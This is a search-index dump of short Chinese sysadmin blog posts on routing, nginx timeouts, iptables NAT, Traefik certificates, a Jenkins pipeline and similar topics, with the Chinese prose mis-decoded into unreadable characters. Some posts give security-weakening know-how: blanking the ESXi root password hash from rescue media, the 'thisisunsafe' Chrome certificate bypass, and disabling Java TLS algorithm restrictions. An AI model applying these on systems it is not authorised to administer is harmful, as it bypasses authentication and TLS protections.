å…¶å®ƒç½‘æ®µæŒ‡å®šç½‘å…³ ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:3","tags":["mac","unix"],"title":"mac osxä¿®æ”¹macåœ°å€å’Œç®¡ç†è·¯ç”±è¡¨çš„æ–¹æ³•","uri":"/post/2232/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" set from=xxx@qq.com set smtp=smtp.qq.com set smtp-auth-user=xxx@qq.com set smtp-auth-password=xxx set smtp-auth=login echo \"é‚®ä»¶å†…å®¹\" | mailx -s \"é‚®ä»¶æ ‡é¢˜\" xxx@qq.com ","date":"2021-03-03 11:04","objectID":"/post/2800/:0:0","tags":["mail"],"title":"mailxå‘½ä»¤è¡Œå‘é€é‚®ä»¶","uri":"/post/2800/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"keepalive_timeout 75s 20s é»˜è®¤75s, è¡¨ç¤ºå½“å®¢æˆ·ç«¯å’Œ Nginx ä¹‹é—´çš„è¿æ¥ç©ºé—² 75 ç§’æ—¶ï¼ŒNginx å°†å…³é—­è¿æ¥ã€‚ä½†å¦‚æœå®¢æˆ·ç«¯åœ¨75 ç§’å†…å‘é€äº†æ–°çš„è¯·æ±‚ï¼ŒNginx å°†é‡ç½®è®¡æ—¶å™¨ï¼Œä¿æŒtcpè¿æ¥æ‰“å¼€çŠ¶æ€ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œåœ¨å“åº”æŠ¥å¤´ä¸­è®¾ç½®ä¸€ä¸ªå€¼Keep-Aliveï¼šTimeout=20ã€‚ ","date":"2021-03-03 10:07","objectID":"/post/2231/:0:1","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"nginx -\u003e backend ","date":"2021-03-03 10:07","objectID":"/post/2231/:1:0","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1. proxy_connect_timeout(è¿æ¥) å®šä¹‰nginxä¸åç«¯æœåŠ¡å»ºç«‹è¿æ¥çš„è¶…æ—¶æ—¶é—´ã€‚æ­¤è¶…æ—¶é€šå¸¸ä¸èƒ½è¶…è¿‡75ç§’ã€‚é»˜è®¤60ç§’ ","date":"2021-03-03 10:07","objectID":"/post/2231/:1:1","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2. proxy_read_timeout(å“åº”) åç«¯æœåŠ¡ç»™nginxå“åº”çš„æ—¶é—´ï¼Œè§„å®šæ—¶é—´å†…åç«¯æœåŠ¡æ²¡æœ‰ç»™nginxå“åº”ï¼Œè¿æ¥ä¼šè¢«å…³é—­ï¼Œnginxè¿”å›504 Gateway Time-outã€‚é»˜è®¤60ç§’ ","date":"2021-03-03 10:07","objectID":"/post/2231/:1:2","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"3. proxy_send_timeout(è¯·æ±‚) å®šä¹‰nginxå‘åç«¯æœåŠ¡å‘é€è¯·æ±‚çš„é—´éš”æ—¶é—´(ä¸æ˜¯è€—æ—¶)ã€‚é»˜è®¤60ç§’ï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå…³é—­è¿æ¥, è¿™ä¸ªè¦å¤§äºproxy_read_timeout ","date":"2021-03-03 10:07","objectID":"/post/2231/:1:3","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"client -\u003e nginx ","date":"2021-03-03 10:07","objectID":"/post/2231/:2:0","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1. client_body_timeout å®šä¹‰å®¢æˆ·ç«¯å‘é€bodyçš„è¶…æ—¶æ—¶é—´ï¼Œå¦‚æœå®¢æˆ·ç«¯åœ¨è¯¥æ—¶é—´å†…æ²¡æœ‰å°†bodyå‘é€å®Œæ¯•ï¼ŒNginx å°†ä¼šå…³é—­è¿æ¥ã€‚ ","date":"2021-03-03 10:07","objectID":"/post/2231/:2:1","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2. client_header_timeout å®šä¹‰å®¢æˆ·ç«¯å‘é€headerçš„è¶…æ—¶æ—¶é—´ï¼Œå¦‚æœå®¢æˆ·ç«¯åœ¨è¯¥æ—¶é—´å†…æ²¡æœ‰å‘é€å®Œheaderï¼ŒNginx å°†ä¼šå…³é—­è¿æ¥ã€‚ ","date":"2021-03-03 10:07","objectID":"/post/2231/:2:2","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"3. send_timeout(å“åº”) å®šä¹‰ Nginx å‘å®¢æˆ·ç«¯å‘é€å“åº”å†…å®¹çš„è¶…æ—¶æ—¶é—´ï¼Œå¦‚æœ Nginx åœ¨è¯¥æ—¶é—´å†…æ²¡æœ‰å°†å“åº”å‘é€å®Œæ¯•(å¼€å§‹å‘é€responseåˆ°responseå‘é€å®Œæ¯•çš„æ—¶é—´)ï¼ŒNginx å°†ä¼šå…³é—­è¿æ¥ã€‚ ","date":"2021-03-03 10:07","objectID":"/post/2231/:2:3","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.è¿›å…¥è™šæ‹Ÿæœºçš„è™šæ‹Ÿæœºé€‰é¡¹-é«˜çº§-é…ç½®å‚æ•°-ç¼–è¾‘é…ç½® 72894-lygm5bqpfu.png ","date":"2021-02-20 10:32","objectID":"/post/2223/:0:1","tags":["esxi","vsphere"],"title":"vSphere 6.5(VMware Remote Console)ESXIå¼€å¯è¿œç¨‹å¤åˆ¶ç²˜è´´","uri":"/post/2223/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"2.æ·»åŠ å¦‚ä¸‹ä¸¤ä¸ªå‚æ•°(å…³æœºçŠ¶æ€ä¸‹) isolation.tools.copy.disable FALSE isolation.tools.paste.disable FALSE ","date":"2021-02-20 10:32","objectID":"/post/2223/:0:2","tags":["esxi","vsphere"],"title":"vSphere 6.5(VMware Remote Console)ESXIå¼€å¯è¿œç¨‹å¤åˆ¶ç²˜è´´","uri":"/post/2223/"},{"categories":["å…¶ä»–"],"content":"æ–¹æ³•1(å¯èƒ½æ— æ•ˆ). è¿›å…¥winæ§åˆ¶é¢æ¿ï¼Œè¿›å…¥javaæ§åˆ¶é¢æ¿ï¼Œå‹¾é€‰åè®® 46997-80cf5ll9qyh.png ","date":"2021-02-20 10:23","objectID":"/post/2218/:1:0","tags":["dell"],"title":"idracè¿æ¥æŠ¥é”™-æŸ¥çœ‹å™¨å·²ç»ˆæ­¢ åŸå› ï¼šç½‘ç»œè¿æ¥ç»ˆç«¯","uri":"/post/2218/"},{"categories":["å…¶ä»–"],"content":"æ–¹æ³•2.ä¿®æ”¹java.security æ–‡ä»¶è·¯å¾„ï¼šC:\\Program Files\\Java\\jre1.8.0_271\\lib\\security\\java.security æ³¨é‡Šjdk.tls.disabledAlgorithms 08705-cyfop0plttr.png ä»¥ä¸Šä¸ºä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼Œæœ€å¥½è¿˜æ˜¯å‡çº§idrac,ä¸€èˆ¬å¯ä»¥è§£å†³ ","date":"2021-02-20 10:23","objectID":"/post/2218/:2:0","tags":["dell"],"title":"idracè¿æ¥æŠ¥é”™-æŸ¥çœ‹å™¨å·²ç»ˆæ­¢ åŸå› ï¼šç½‘ç»œè¿æ¥ç»ˆç«¯","uri":"/post/2218/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" yum install http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm rpm --import http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro yum install -y ffmpeg-2.8.15-2.el7.nux ffmpeg -version ","date":"2021-02-10 17:38","objectID":"/post/2565/:0:0","tags":["ffmpeg"],"title":"yumå®‰è£…ffmpeg","uri":"/post/2565/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.ç”¨centos6å…‰ç›˜å¯åŠ¨ï¼Œè¿›å…¥æ•‘æ´(æ¢å¤)æ¨¡å¼ã€‚ 2.è¿›å…¥shellæ¨¡å¼ 3.æŒ‚è½½åˆ†åŒº mkdir /mnt/sda5 mount /dev/sda5 /mnt/sda5 4.å°†å«æœ‰shadowæ–‡ä»¶çš„å‹ç¼©æ–‡ä»¶copyå‡ºæ¥ cp /mnt/sda5/state.tgz /tmp/ 5.è§£å‹state.tgz,å¾—åˆ°local.tgz,å†æ¬¡è§£å‹ tar xf state.tgz tar xf local.tgz 6.è§£å‹å®Œæˆåå¾—åˆ°ä¸€ä¸ªetcç›®å½•,shadowæ–‡ä»¶åœ¨etcç›®å½•ä¸­.å°†rootå¯†ç éƒ¨åˆ†åˆ æ‰ vi etc/shadow 7.è¿˜åŸå‹ç¼©åŒ… # åˆ é™¤åŸåŒ… rm -rf state.tgz local.tgz # å°†etcå‹ç¼©ä¸ºlocal.tgz tar zcf local.tgz etc # å°†local.tgzå‹ç¼©ä¸ºstate.tgz tar zcf state.tgz local.tgz # å°†state.tgzæ”¾å›åŸä½ç½® cp state.tgz /mnt/test 8.rebooté‡å¯ ","date":"2021-02-05 11:25","objectID":"/post/2213/:0:0","tags":["esxi"],"title":"vmware esxiå¯†ç ç ´è§£é‡ç½®","uri":"/post/2213/"},{"categories":["å…¶ä»–"],"content":"åœ¨ä¸èƒ½è®¿é—®çš„é¡µé¢ä¸­è¾“å…¥thisisunsafe,ç„¶åæµè§ˆå™¨å°±ä¼šè·³è½¬è¿›å…¥äº† ","date":"2021-02-03 14:24","objectID":"/post/2211/:0:0","tags":[],"title":"chromeæµè§ˆå™¨å¿½ç•¥è¯ä¹¦é”™è¯¯","uri":"/post/2211/"},{"categories":["docker"],"content":" FROM debian:stable ENV TZ=Asia/Shanghai COPY fonts/ /usr/share/fonts COPY sources.list /etc/apt/ RUN apt update \u0026\u0026 apt install -y libreoffice python3-pip; exit 0 \u0026\u0026 apt autoclean \u0026\u0026 rm -fr /var/cache/* sources.list deb http://mirrors.163.com/debian/ buster main contrib non-free # deb-src http://mirrors.163.com/debian/ buster main contrib non-free deb http://mirrors.163.com/debian/ buster-updates main contrib non-free # deb-src http://mirrors.163.com/debian/ buster-updates main contrib non-free deb http://mirrors.163.com/debian/ buster-backports main contrib non-free # deb-src http://mirrors.163.com/debian/ buster-backports main contrib non-free deb http://mirrors.163.com/debian-security buster/updates main contrib non-free # deb-src http://mirrors.163.com/debian-security buster/updates main contrib non-free ","date":"2021-02-02 10:03","objectID":"/post/2210/:0:0","tags":["docker"],"title":"debian-libreofficeé•œåƒ","uri":"/post/2210/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"https://vcsa.xxx.xxx/ui/?locale=zh_CN ä¸­æ–‡ï¼š/?locale=zh_CN è‹±è¯­ï¼š/?locale=en_US ","date":"2021-02-02 08:59","objectID":"/post/2567/:0:0","tags":[],"title":"vsphere web client ä¿®æ”¹ä¸ºä¸­æ–‡","uri":"/post/2567/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸæ–‡é“¾æ¥ï¼šhttps://www.jianshu.com/p/b52d1e41a461 ","date":"2021-01-21 15:02","objectID":"/post/2204/:0:0","tags":["linux"],"title":"linuxä¸‹é™æ€è·¯ç”±ä¿®æ”¹å‘½ä»¤","uri":"/post/2204/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ–¹æ³•ä¸€(route)ï¼š æ·»åŠ è·¯ç”± route add -net 192.168.0.0/24 gw 192.168.0.1 route add -host 192.168.1.1 dev eth0 åˆ é™¤è·¯ç”± route del -net 192.168.0.0/24 gw 192.168.0.1 add å¢åŠ è·¯ç”± del åˆ é™¤è·¯ç”± -net è®¾ç½®åˆ°æŸä¸ªç½‘æ®µçš„è·¯ç”±Â gw å‡ºå£ç½‘å…³IPåœ°å€ -host è®¾ç½®åˆ°æŸå°ä¸»æœºçš„è·¯ç”±Â dev å‡ºå£ç½‘å…³ç‰©ç†è®¾å¤‡å å¢åŠ é»˜è®¤è·¯ç”±ï¼šroute add default gw 192.168.0.1 route -n æŸ¥çœ‹è·¯ç”±è¡¨ ","date":"2021-01-21 15:02","objectID":"/post/2204/:1:0","tags":["linux"],"title":"linuxä¸‹é™æ€è·¯ç”±ä¿®æ”¹å‘½ä»¤","uri":"/post/2204/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ–¹æ³•äºŒ(ip route)ï¼š æ·»åŠ è·¯ç”± ip route add 192.168.0.0/24 via 192.168.0.1 ip route add 192.168.1.1 dev eth0 åˆ é™¤è·¯ç”± ip route del 192.168.0.0/24 via 192.168.0.1 add å¢åŠ è·¯ç”± del åˆ é™¤è·¯ç”± via ç½‘å…³å‡ºå£ IPåœ°å€ dev ç½‘å…³å‡ºå£ç‰©ç†è®¾å¤‡å å¢åŠ é»˜è®¤è·¯ç”±:ip route add default via 192.168.0.1 dev eth0 ip routeæŸ¥çœ‹è·¯ç”±ä¿¡æ¯ ","date":"2021-01-21 15:02","objectID":"/post/2204/:2:0","tags":["linux"],"title":"linuxä¸‹é™æ€è·¯ç”±ä¿®æ”¹å‘½ä»¤","uri":"/post/2204/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åœ¨linuxä¸‹è®¾ç½®æ°¸ä¹…è·¯ç”±ï¼š æ–¹æ³•1ï¼šåœ¨/etc/rc.localé‡Œæ·»åŠ  route add -net 192.168.0.0/24 dev eth0 route add -net 192.168.1.0/24 gw 192.168.2.254 æ–¹æ³•2ï¼š/etc/sysconfig/static-routes : (æ²¡æœ‰static-routesçš„è¯å°±æ‰‹åŠ¨å»ºç«‹ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶) any net 192.168.0.0/24 gw 192.168.3.254 any net 10.250.228.128 netmask 255.255.255.192 gw 10.250.228.129 ","date":"2021-01-21 15:02","objectID":"/post/2204/:3:0","tags":["linux"],"title":"linuxä¸‹é™æ€è·¯ç”±ä¿®æ”¹å‘½ä»¤","uri":"/post/2204/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¼€å¯ IP è½¬å‘ï¼š # echo \"1\" \u003e/proc/sys/net/ipv4/ip_forward (ä¸´æ—¶) # vi /etc/sysctl.conf --\u003e net.ipv4.ip_forward=1 (æ°¸ä¹…å¼€å¯) ","date":"2021-01-21 15:02","objectID":"/post/2204/:4:0","tags":["linux"],"title":"linuxä¸‹é™æ€è·¯ç”±ä¿®æ”¹å‘½ä»¤","uri":"/post/2204/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸»æœº1: å…¬ç½‘åœ°å€: 10.0.0.14 å†…ç½‘åœ°å€: 172.16.0.1 ä¸»æœº2 å†…ç½‘åœ°å€: 172.16.0.10 ä¸»æœº1é…ç½® iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -j SNAT --to-source 10.0.0.14 # å¼€å¯ipv4æµé‡è½¬å‘ echo 'net.ipv4.ip_forward=1' \u003e\u003e /etc/sysctl.conf sysctl -p ä¸»æœº2é…ç½® # ä¿®æ”¹ç½‘å…³ route add default gw 172.16.0.1 åˆ é™¤ç½‘å…³: route del -net 0.0.0.0/0 gw 172.16.0.1 ","date":"2021-01-21 14:44","objectID":"/post/2203/:0:0","tags":["iptables"],"title":"iptableså…±äº«ç½‘ç»œ","uri":"/post/2203/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸€ã€å‡†å¤‡å·¥ä½œ è¿™é‡Œä½¿ç”¨çš„alidnsï¼Œåˆ›å»ºAccessKey 29603-16eeja057wk.png åˆ›å»ºsecret kubectl create secret generic traefik-alidns-secret --from-literal=ALICLOUD_ACCESS_KEY=\u003cAK\u003e --from-literal=ALICLOUD_SECRET_KEY=\u003cSK\u003e --from-literal=ALICLOUD_REGION_ID=cn-shanghai -n traefik-v2 ","date":"2021-01-14 10:47","objectID":"/post/2198/:1:0","tags":["k8s","traefik"],"title":"Traefiké…ç½®Let's Encryptè‡ªåŠ¨ç”Ÿæˆè¯ä¹¦[alidns](ä¸‰)","uri":"/post/2198/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"äºŒã€ä¿®æ”¹traefiké…ç½®(conf.yaml) # æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯å›ºå®šèŠ‚ç‚¹ nodeSelector: kubernetes.io/hostname: test-k8s-node1 # æŒä¹…åŒ–acme.json deployment: additionalVolumes: - name: acme hostPath: path: /etc/acme/ additionalVolumeMounts: - name: acme mountPath: /etc/acme/ additionalArguments: # è¿™ä¸ªæ˜¯ç”¨äºæµ‹è¯•çš„æ—¶å€™ä½¿ç”¨çš„åœ°å€ï¼Œå½“æµ‹è¯•è¯ä¹¦æ²¡é—®é¢˜ä»¥åï¼Œéœ€è¦æ³¨é‡Šä¸‹é¢è¿™ä¸ªé…ç½®ã€‚ # å¦‚æœè¯ä¹¦ç”±CN=Fake LE Intermediate X1é¢å‘ï¼Œè¡¨ç¤ºç¬¦åˆé¢„æœŸã€‚å¯ä»¥ç”¨è¿‡curl -s -vv1çœ‹åˆ°ã€‚ # - \"--certificatesResolvers.ali.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory\" # æŒ‡å®šdnsçš„provider,å…¶ä»–provider: https://doc.traefik.io/traefik/https/acme/#providers - \"--certificatesResolvers.ali.acme.dnsChallenge.provider=alidns\" # ç”¨äºæ³¨å†Œçš„ç”µå­é‚®ä»¶åœ°å€ - \"--certificatesResolvers.ali.acme.email=742899387@qq.com\" # è®¾ç½®ACMEè¯ä¹¦çš„ä¿å­˜ä½ç½® - \"--certificatesResolvers.ali.acme.storage=/etc/acme/acme.json\" # ä½¿ç”¨æ­¥éª¤ä¸€åˆ›å»ºçš„secret envFrom: - secretRef: name: traefik-alidns-secret securityContext: capabilities: drop: [] readOnlyRootFilesystem: false runAsGroup: 0 runAsNonRoot: false runAsUser: 0 æ›´æ–°traefik helm upgrade -n traefik-v2 traefik ./traefik -f conf.yaml ","date":"2021-01-14 10:47","objectID":"/post/2198/:2:0","tags":["k8s","traefik"],"title":"Traefiké…ç½®Let's Encryptè‡ªåŠ¨ç”Ÿæˆè¯ä¹¦[alidns](ä¸‰)","uri":"/post/2198/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸‰ã€æµ‹è¯• nginxåº”ç”¨ apiVersion: apps/v1 kind: Deployment metadata: name: nginx-test namespace: kube-ops spec: selector: matchLabels: app: nginx test: \"true\" template: metadata: labels: app: nginx test: \"true\" spec: containers: - name: nginx-test ports: - name: http containerPort: 80 image: nginx:1.17.10 --- apiVersion: v1 kind: Service metadata: name: nginx-test namespace: kube-ops spec: selector: app: nginx test: \"true\" type: ClusterIP ports: - name: web port: 80 targetPort: http ingressrouteé…ç½® --- apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: nginx-test namespace: kube-ops spec: entryPoints: - websecure routes: - match: Host(`test.soulchild.site`) kind: Rule services: - name: nginx-test port: 80 tls: certResolver: ali domains: - main: \"*.soulchild.site\" ç”±äºåŸŸåæ²¡æœ‰å¤‡æ¡ˆï¼Œä¸èƒ½è®¿é—®ï¼Œæˆ‘è¿™é‡Œç›´æ¥è§£æåˆ°traefik pod ipï¼Œè®¿é—®æµ‹è¯• 96068-0h8126hyenof.png ","date":"2021-01-14 10:47","objectID":"/post/2198/:3:0","tags":["k8s","traefik"],"title":"Traefiké…ç½®Let's Encryptè‡ªåŠ¨ç”Ÿæˆè¯ä¹¦[alidns](ä¸‰)","uri":"/post/2198/"},{"categories":["devops"],"content":"mvn String jobName = \"${env.JOB_BASE_NAME}\".toLowerCase() String imageName = \"swr.cn-east-2.myhuaweicloud.com/all-${deployEnv}/${jobName}:${BUILD_ID}\" String gitAddr = \"http://gitlab.xxx.com/xxx/server.git\" pipeline{ agent any parameters { text(defaultValue: '0m', description: 'request_cpu', name: 'request_cpu') text(defaultValue: '1Gi', description: 'request_memory', name: 'request_memory') text(defaultValue: '1000m', description: 'limit_cpu', name: 'limit_cpu') text(defaultValue: '2Gi', description: 'limit_memory', name: 'limit_memory') // choice(choices: ['blade-xxx'], description: 'æœåŠ¡åç§°', name: 'serverName') // choice(choices: ['devops'], description: 'å‘½åç©ºé—´', name: 'nameSpace') // choice(choices: ['dev'], description: 'éƒ¨ç½²ç¯å¢ƒ[dev,test,prod]', name: 'deployEnv') // choice(choices: ['dev'], description: 'éƒ¨ç½²åˆ†æ”¯', name: 'branchName') choice(choices: ['1','2'], description: 'å‰¯æœ¬æ•°é‡', name: 'replicas') } options { timestamps() //æ˜¾ç¤ºæ—¥å¿—æ—¶é—´ skipDefaultCheckout() //åˆ é™¤éšå¼checkout scmè¯­å¥ disableConcurrentBuilds() //ç¦æ­¢å¹¶è¡Œ timeout(time: 20, unit: 'MINUTES') //æµæ°´çº¿è¶…æ—¶æ—¶é—´10åˆ†é’Ÿ } stages{ stage(\"æ‹‰å–ä»£ç \"){ steps{ script{ wrap([$class: 'BuildUser']) { currentBuild.description = \"Started by user:${env.BUILD_USER},branch:${branchName}\" } checkout([$class: 'GitSCM', branches: [[name: \"${branchName}\"]], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[url: \"${gitAddr}\"]]]) } } } stage(\"ç¼–è¯‘\"){ steps{ script{ mvnHome = tool \"M3\" sh \"${mvnHome}/bin/mvn clean package -U -pl `find ./ -name ${serverName}` -am -Dmaven.test.skip=true\" } } } stage(\"åˆ¶ä½œé•œåƒ\"){ steps{ script{ sh \"cd `find ./ -name ${serverName}` \u0026\u0026 docker build -t ${imageName} .\" } } } stage(\"ä¸Šä¼ é•œåƒ\"){ steps{ script{ sh \"docker push ${imageName}\" } } post{ always{ script{ sh \"docker rmi ${imageName}\" } } } } stage(\"ç”Ÿæˆyaml\"){ steps{ script{ //ä¿®æ”¹å‘½åç©ºé—´ sh \"sed -i s#{nameSpace}#${nameSpace}# devops/${serverName}.yaml\" //ä¿®æ”¹é•œåƒåœ°å€ sh \"sed -i s#{imageName}#${imageName}# devops/${serverName}.yaml\" //éƒ¨ç½²ç¯å¢ƒ sh \"sed -i s#{deployEnv}#${deployEnv}# devops/${serverName}.yaml\" //è®¾ç½®å‰¯æœ¬æ•°é‡ sh \"sed -i s#{replicas}#${replicas}# devops/${serverName}.yaml\" //èµ„æºé™åˆ¶ sh \"sed -i s#{request_cpu}#${request_cpu}# devops/${serverName}.yaml\" sh \"sed -i s#{request_memory}#${request_memory}# devops/${serverName}.yaml\" sh \"sed -i s#{limit_cpu}#${limit_cpu}# devops/${serverName}.yaml\" sh \"sed -i s#{limit_memory}#${limit_memory}# devops/${serverName}.yaml\" //ä¿®æ”¹gatewayçš„åŸŸå if ( \"${serverName}\" == \"gateway\") { sh \"sed -i s#{domainName}#${domainName}# devops/${serverName}.yaml\" } } } } stage(\"éƒ¨ç½²\"){ steps{ script{ sh \"cat devops/${serverName}.yaml\" switch(\"${deployEnv}\") { case \"dev\": kubeConfig = \"/root/.kube/test.config\" break ;; case \"test\": kubeConfig = \"/root/.kube/test.config\" break ;; case \"prod\": kubeConfig = \"/root/.kube/prod.config\" break ;; break println(\"æœªçŸ¥ç¯å¢ƒ\") ;; } sh \"kubectl apply -f devops/${serverName}.yaml --record --kubeconfig=${kubeConfig}\" } } } stage(\"å°±ç»ªæ£€æµ‹\"){ steps{ timeout(time: 10, unit: 'MINUTES'){ //æ­¥éª¤è¶…æ—¶æ—¶é—´ script{ sh \"kubectl rollout status -n ${nameSpace} deployment ${serverName} --kubeconfig=${kubeConfig}\" } } } } } } node String jobName = \"${env.JOB_BASE_NAME}\".toLowerCase() String imageName = \"swr.cn-east-2.myhuaweicloud.com/all-${deployEnv}/${jobName}:${BUILD_ID}\" String gitAddr = \"http://gitlab.xxx.com/xxx/frontend.git\" pipeline{ agent any /*parameters { choice(choices: ['blade-xxx'], description: 'æœåŠ¡åç§°', name: 'serverName') choice(choices: ['devops'], description: 'å‘½åç©ºé—´', name: 'nameSpace') choice(choices: ['dev'], description: 'éƒ¨ç½²ç¯å¢ƒ[dev,test,prod]', name: 'deployEnv') choice(choices: ['dev'], description: 'éƒ¨ç½²åˆ†æ”¯', name: 'branchName') choice(choices: ['1'], description: 'å‰¯æœ¬æ•°é‡', name: 'replicas') }*/ options { timestamps() //æ˜¾ç¤ºæ—¥å¿—æ—¶é—´ skipDefaultCheckout() //åˆ é™¤éšå¼checkout scmè¯­å¥ disableConcurrentBuilds() //ç¦æ­¢å¹¶è¡Œ timeout(time: 20, unit: 'MINUTES') //æµæ°´çº¿è¶…æ—¶æ—¶é—´10åˆ†é’Ÿ } stages{ stage(\"æ‹‰å–ä»£ç \"){ steps{ script{ wrap([$class: 'BuildUser']) { currentBuild.description = \"Started by user:${env.BUILD_US","date":"2021-01-12 16:42","objectID":"/post/2195/:0:0","tags":["jenkins"],"title":"kubernetes pipeline Jenkinsfileæ¨¡æ¿","uri":"/post/2195/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸæ–‡é“¾æ¥: https://blog.csdn.net/ayu_ag/article/details/51123198 åœ¨linuxä¸­ï¼Œä½¿ç”¨stat foo.txt å‘½ä»¤å¯ä»¥çœ‹åˆ°æ–‡ä»¶foo.txtçš„ä¸‰ä¸ªæ—¶é—´ï¼š atimeï¼šaccess timeï¼Œè®¿é—®æ—¶é—´ mtimeï¼šmodify timeï¼Œä¿®æ”¹æ—¶é—´ï¼Œæ–‡ä»¶å†…å®¹æœ‰ä¿®æ”¹ ctimeï¼šchange timeï¼Œcreate timeï¼Œæ”¹å˜æ—¶é—´ï¼Œæ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹å‘ç”Ÿå˜åŒ–ï¼Œå…·ä½“çš„æƒ…å†µæœ‰ï¼š1ã€æ–‡ä»¶å†…å®¹æœ‰ä¿®æ”¹ï¼›2ã€æ–‡ä»¶æƒé™æœ‰ä¿®æ”¹ï¼›3ã€inodeå˜äº†ï¼›4ã€é‡å‘½å(é‡å‘½åä¸ä¼šå¯¼è‡´inodeæ”¹å˜) PSï¼š 1ã€å¦‚æœç”¨viå»ä¿®æ”¹æŸä¸ªæ–‡ä»¶ï¼Œå¯èƒ½ä¼šå‘ç°è¿™ä¸‰ä¸ªæ—¶é—´éƒ½è¢«æ›´æ–°äº†ï¼Œå› ä¸ºviä½¿ç”¨äº†ä¸´æ—¶æ–‡ä»¶ä¿å­˜ä¿®æ”¹ï¼Œåœ¨wqæ—¶æ›¿æ¢äº†åŸæ¥çš„æ–‡ä»¶ï¼Œå¯¼è‡´æ–‡ä»¶çš„inodeè¢«æ”¹å˜äº†ï¼Œå¯ä»¥ç”¨ls -liéªŒè¯ä¸€ä¸‹ 2ã€å¦‚æœæƒ³ä¿®æ”¹mtimeï¼Œå¯ä»¥echo â€œhello worldâ€ Â» foo.txtï¼Œæ³¨æ„ctimeä¹Ÿä¼šè·Ÿç€æ”¹å˜ 3ã€å¦‚æœæƒ³ä»…ä»…ä¿®æ”¹ctimeï¼Œå¯ä»¥chmod 644 foo.txtï¼Œmtimeä¸ä¼šæ”¹å˜ 4ã€ä¸ºä»€ä¹ˆæ²¡è¯´atimeå‘¢ï¼Œä¸æ˜¯æƒ³è±¡ä¸­çš„é‚£ä¹ˆç®€å•çš„ï¼Œåé¢è¯¦ç»†åˆ†æ å¯¹äºä¸€ä¸ªæ–‡ä»¶foo.txt ls -l foo.txt æ˜¾ç¤ºçš„æ˜¯mtime ls -l -c foo.txt æ˜¾ç¤ºçš„æ˜¯ctime ls -l -u foo.txt æ˜¾ç¤ºçš„æ˜¯atime å¯¹äºatimeï¼Œå½“ä½ ä»¥ä¸ºcat foo.txtç„¶åstat foo.txtèƒ½çœ‹åˆ°atimeæ”¹å˜çš„è¯ï¼Œå¾ˆå¯èƒ½å°±ä¼šå¤±æœ›äº†ï¼Œå¹¶ä¸æ˜¯æ¯æ¬¡atimeéƒ½æ›´æ–°çš„ atimeå’Œmountçš„å‚æ•°ä»¥åŠå†…æ ¸æœ‰å…³ï¼š atime Do not use noatime feature, then the inode access time is controlled by kernel defaults. See also the description for strictatime and relatime mount options. noatime Do not update inode access times on this filesystem (e.g., for faster access on the news spool to speed up news servers). relatime Update inode access times relative to modify or change time. Access time is only updated if the previous access time was earlier than the current modify or change time. (Similar to noatime, but doesn't break mutt or other applications that need to know if a file has been read since the last time it was modified.) Since Linux 2.6.30, the kernel defaults to the behavior provided by this option (unless noatime was specified), and the strictatime option is required to obtain traditional semantics. In addition, since Linux 2.6.30, the file's last access time is always updated if it is more than 1 day old. norelatime Do not use relatime feature. See also the strictatime mount option. strictatime Allows to explicitly requesting full atime updates. This makes it posâ€ sible for kernel to defaults to relatime or noatime but still allow userspace to override it. \u003cspan style=\"color:#ff0000;\"\u003eFor more details about the default system mount options see /proc/mounts\u003c/span\u003e. nostrictatime Use the kernel's default behaviour for inode access time updates. å¦‚æœä½¿ç”¨noatimeï¼Œé‚£ä¹ˆatimeå°±ä¸ä¼šè¢«æ›´æ–°ï¼Œå³ä½¿ä¿®æ”¹äº†æ–‡ä»¶å†…å®¹ å¦‚æœä½¿ç”¨atimeï¼Œé‡‡ç”¨å†…æ ¸é»˜è®¤è¡Œä¸ºï¼Œkernel2.6.30åå°±ç›¸å½“äºä½¿ç”¨äº†relatime 